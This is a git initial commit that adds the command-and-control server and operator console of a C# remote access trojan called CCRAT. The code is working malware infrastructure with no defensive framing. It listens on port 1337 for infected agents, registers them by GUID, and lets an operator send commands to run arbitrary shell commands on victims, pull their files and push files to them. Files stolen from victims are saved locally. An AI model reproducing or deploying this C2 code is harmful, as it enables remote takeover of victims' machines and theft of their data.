50bfe2f8b080d3bdab7ea2a84696c5a8880c1b2d
root <root@ZIBAWARE-1.localdomain>
2020-09-09 19:12:38 -0400

    initial commit

---
+++ CCRAT_C2/C2Server.cs
@@ -0,0 +1,100 @@
+﻿using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Sockets;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace CCRAT_C2
+{
+    class C2Server
+    {
+        private Dictionary<Guid, TcpClient> clientConnections = new Dictionary<Guid, TcpClient>();
+        public void Listen()
+        {
+            IPAddress zeros = IPAddress.Parse("0.0.0.0");
+            TcpListener server = new TcpListener(zeros, 1337);
+            server.Start();
+            Task t = new Task(() => AcceptLoop(server));
+            t.Start();
+        }
+        private void AcceptLoop(TcpListener s)
+        {
+            while (true)
+            {
+                TcpClient clientConnection = s.AcceptTcpClient();
+                Task t = new Task(() => AddClient(clientConnection));
+                t.Start();
+            }
+        }
+        private void AddClient(TcpClient clientConnection)
+        {
+            StreamReader reader = new StreamReader(clientConnection.GetStream());
+            string encodedHandshake = reader.ReadLine();
+            Guid id = new Guid(Convert.FromBase64String(encodedHandshake));
+            clientConnections.Add(id, clientConnection);
+            Console.WriteLine("New client connected with GUID of " + id.ToString());
+            Console.WriteLine("Started listening for data from new client... ");
+            while (true)
+            {
+                string line = reader.ReadLine();
+                string json = Encoding.UTF8.GetString(Convert.FromBase64String(line));
+                CommsPackage cp = JsonConvert.DeserializeObject<CommsPackage>(json);
+                ProcessReply(cp, id);
+            }
+        }
+
+        private void ProcessReply(CommsPackage reply, Guid agent)
+        {
+            Console.WriteLine("[+] Got some data from agent: " + agent.ToString());
+            Console.WriteLine("[+] Data type: " + reply.Command);
+            switch (reply.Command)
+            {
+                case "exec":
+                    Console.WriteLine(Encoding.UTF8.GetString(reply.Data));
+                    break;
+                case "download":
+                    FileInfo fi = JsonConvert.DeserializeObject<FileInfo>(Encoding.UTF8.GetString(reply.Data));
+                    
+                    try
+                    {
+                        File.WriteAllBytes(Path.GetFileName(fi.Path), fi.Data);
+                    }
+                    catch
+                    {
+                        Console.WriteLine("An error occurred in file write handling");
+                    }
+                    break;
+                default:
+                    break;
+            }
+        }
+
+        public void SendCommand(Guid agent, CommsPackage cp)
+        {
+            Console.WriteLine("Marshalling command");
+            TcpClient client;
+
+            if(!clientConnections.TryGetValue(agent, out client))
+            {
+                Console.WriteLine("Agent with guid "+agent.ToString()+" not connected!");
+                return;
+            }
+
+            string payload = JsonConvert.SerializeObject(cp);
+
+            payload = Convert.ToBase64String(Encoding.UTF8.GetBytes(payload));
+
+            StreamWriter stream = new StreamWriter(client.GetStream());
+
+            stream.WriteLine(payload);
+            stream.Flush();
+
+            Console.WriteLine("Payload sent");
+        }
+
+    }
+}
---
+++ CCRAT_C2/Program.cs
@@ -0,0 +1,92 @@
+﻿using Newtonsoft.Json;
+using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace CCRAT_C2
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            C2Server c2 = new C2Server();
+            c2.Listen();
+
+            while (true)
+            {
+                Console.Write(">");
+                string line = Console.ReadLine();
+                if(line == "")
+                {
+                    continue;
+                }
+                string[] fields = line.Split(' ');
+                try
+                {
+                    Guid agent = new Guid(fields[0]);
+                    CommsPackage cp;
+                    switch (fields[1])
+                    {
+                        case "exec":
+                            cp = ExecComms(fields);
+                            break;
+                        case "download":
+                            cp = ExecDownload(fields);
+                            break;
+                        case "upload":
+                            cp = ExecUpload(fields);
+                            break;
+                        default:
+                            cp = new CommsPackage();
+                            break;
+                    }
+                    c2.SendCommand(agent, cp);
+                }
+                catch
+                {
+                    Console.WriteLine("Syntax error.");
+                }
+                
+
+            }
+        }
+        private static CommsPackage ExecComms(string[] fields)
+        {
+            string command = "";
+            for(int i = 2; i < fields.Length; i++)
+            {
+                command += fields[i] + " ";
+            }
+            CommsPackage cp = new CommsPackage();
+            cp.Command = "exec";
+            cp.Data = Encoding.UTF8.GetBytes(command);
+            return cp;
+        }
+
+        private static CommsPackage ExecDownload(string[] fields)
+        {
+            CommsPackage cp = new CommsPackage();
+            cp.Command = "download";
+            FileInfo fi = new FileInfo();
+            fi.Path = fields[2];
+            cp.Data = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(fi));
+            return cp;
+        }
+
+        private static CommsPackage ExecUpload(string[] fields)
+        {
+            CommsPackage cp = new CommsPackage();
+            cp.Command = "upload";
+            FileInfo fi = new FileInfo();
+            fi.Path = fields[2];
+            fi.Data = File.ReadAllBytes(fields[3]);
+            cp.Data = Encoding.UTF8.GetBytes(JsonConvert.SerializeObject(fi));
+            return cp;
+
+        }
+    }
+
+}
